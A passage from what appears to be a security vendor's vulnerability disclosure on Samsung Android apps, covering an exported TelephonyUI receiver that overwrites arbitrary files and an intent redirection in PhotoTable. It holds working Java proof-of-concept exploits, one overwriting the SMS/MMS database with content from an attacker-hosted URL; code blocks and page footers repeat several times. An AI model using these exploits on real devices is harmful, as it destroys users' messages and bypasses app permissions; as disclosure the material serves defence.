  IOUtils.copy(inputStream, outputStream);
  }
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  }
  }).start();

## The vulnerability in TelephonyUI

The receiver `com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver` is exported. It saves files from the URL specified in `photoring_uri` to the path specified in `down_file`. This was detected by the Oversecured Android scanner:

![](https://framerusercontent.com/images/qF2lr339qcEGQIL0bR3vLvmIw.png?width=2252&height=13590)

The only requirement is that the content-type of the server response should be `image/*` or `video/*`. Therefore, we used the filename `test.mp4` and Amazon S3 automatically specified the `video/mp4`content type in the response.

### Proof of Concept:
  
  
  File dbPath = new File(getPackageManager().getApplicationInfo("com.android.providers.telephony", 0).dataDir, "databases/mmssms.db");
  
  Intent i = new Intent("com.samsung.android.app.telephonyui.action.DOWNLOAD_PHOTORING");
  i.setClassName("com.samsung.android.app.telephonyui", "com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver");
  i.putExtra("photoring_uri", "https://redacted.s3.amazonaws.com/test.mp4");
  i.putExtra("down_file", dbPath.getAbsolutePath());
  sendBroadcast(i);
  
  
  File dbPath = new File(getPackageManager().getApplicationInfo("com.android.providers.telephony", 0).dataDir, "databases/mmssms.db");
  
  Intent i = new Intent("com.samsung.android.app.telephonyui.action.DOWNLOAD_PHOTORING");
  i.setClassName("com.samsung.android.app.telephonyui", "com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver");
  i.putExtra("photoring_uri", "https://redacted.s3.amazonaws.com/test.mp4");
  i.putExtra("down_file", dbPath.getAbsolutePath());
  sendBroadcast(i);
  
  
  File dbPath = new File(getPackageManager().getApplicationInfo("com.android.providers.telephony", 0).dataDir, "databases/mmssms.db");
  
  Intent i = new Intent("com.samsung.android.app.telephonyui.action.DOWNLOAD_PHOTORING");
  i.setClassName("com.samsung.android.app.telephonyui", "com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver");
  i.putExtra("photoring_uri", "https://redacted.s3.amazonaws.com/test.mp4");
  i.putExtra("down_file", dbPath.getAbsolutePath());
  sendBroadcast(i);

As a result, the file with SMS/MMS messages was overwritten with attacker-controlled content.

## The vulnerability in PhotoTable

In PhotoTable, we found [intent redirection](https://blog.oversecured.com/Android-Access-to-app-protected-components/), which allowed access to content providers to be intercepted:

![](https://framerusercontent.com/images/ImmsT931Yo571W9nCaSnEt2Qc.png?width=2260&height=1960)

### Proof of Concept:

We used this vulnerability to hijack the rights to access the SD card. 
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  handle(getIntent());
  }
  
  protected void onNewIntent(Intent intent) {
  super.onNewIntent(intent);
  
  handle(intent);
  }
  
  private void handle(Intent intent) {
  if ("evil".equals(intent.getAction())) {
  String uri = MediaStore.Images.Media.insertImage(getContentResolver(),
  Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888),
  "Title_1337",
  "Description_1337");
  Log.d("evil", "Result: " + uri);
  } else {
  Intent next = new Intent("evil", MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
  next.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
  next.setClass(this, getClass());
  
  Intent i = new Intent();
  i.setClassName("com.android.dreams.phototable", "com.android.dreams.phototable.PermissionsRequestActivity");
  i.putExtra("previous_intent", next);
  i.putExtra("permission_list", new String[0]);
  startActivity(i);
  }
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  handle(getIntent());
  }
  
  protected void onNewIntent(Intent intent) {
  super.onNewIntent(intent);
  
  handle(intent);
  }
  
  private void handle(Intent intent) {
  if ("evil".equals(intent.getAction())) {
  String uri = MediaStore.Images.Media.insertImage(getContentResolver(),
  Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888),
  "Title_1337",
  "Description_1337");
  Log.d("evil", "Result: " + uri);
  } else {
  Intent next = new Intent("evil", MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
  next.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
  next.setClass(this, getClass());
  
  Intent i = new Intent();
  i.setClassName("com.android.dreams.phototable", "com.android.dreams.phototable.PermissionsRequestActivity");
  i.putExtra("previous_intent", next);
  i.putExtra("permission_list", new String[0]);
  startActivity(i);
  }
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  handle(getIntent());
  }
  
  protected void onNewIntent(Intent intent) {
  super.onNewIntent(intent);
  
  handle(intent);
  }
  
  private void handle(Intent intent) {
  if ("evil".equals(intent.getAction())) {
  String uri = MediaStore.Images.Media.insertImage(getContentResolver(),
  Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888),
  "Title_1337",
  "Description_1337");
  Log.d("evil", "Result: " + uri);
  } else {
  Intent next = new Intent("evil", MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
  next.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
  next.setClass(this, getClass());
  
  Intent i = new Intent();
  i.setClassName("com.android.dreams.phototable", "com.android.dreams.phototable.PermissionsRequestActivity");
  i.putExtra("previous_intent", next);
  i.putExtra("permission_list", new String[0]);
  startActivity(i);
  }
  }

Check the next article here: [“Two weeks of securing Samsung devices: Part 2”](https://ovsc.framer.website/blog/two-weeks-of-securing-samsung-devices-part-2)

##### Keep reading

[View all](../blog)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/W9Wn9vbZPPJFNH7MN7Zx6QXches.png?width=2048&height=1194)Android deep link vulnerabilities: how intent filters lead to account takeoverA technical guide to Android deep link security. Learn how intent filter misconfigurations lead to account takeover, and how mobile application security testing with SAST and DAST finds these vulnerability chains.Android SecurityApr 27, 20268min read](./android-deep-link-vulnerabilities)

[![](https://framerusercontent.com/images/3pdKQL7LiXMgBBDS1jzcalJrMnA.png?width=2048&height=1194)Android security checklist: theft of arbitrary filesDevelopers for Android do a lot of work with files and exchange them with other apps, for example, to get photos, images, or user data. Android SecurityMay 20, 202211min readTOp article](./android-security-checklist-theft-of-arbitrary-files)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/W9Wn9vbZPPJFNH7MN7Zx6QXches.png?width=2048&height=1194)Android deep link vulnerabilities: how intent filters lead to account takeoverA technical guide to Android deep link security. Learn how intent filter misconfigurations lead to account takeover, and how mobile application security testing with SAST and DAST finds these vulnerability chains.Android SecurityApr 27, 20268min read](./android-deep-link-vulnerabilities)

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

[](../)

[Blog](../blog)

[Case Studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

2026 © Oversecured

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

[go up ↑](./two-weeks-of-securing-samsung-devices-part-1#header)

[](../)

[go up ↑](./two-weeks-of-securing-samsung-devices-part-1#header)

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

2026 © Oversecured

[Blog](../blog)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

[Case Studies](https://oversecured.com/blog?category=case-study)

[](../)

[Blog](../blog)

[Case Studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

2026 © Oversecured

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

[go up ↑](./two-weeks-of-securing-samsung-devices-part-1#header)
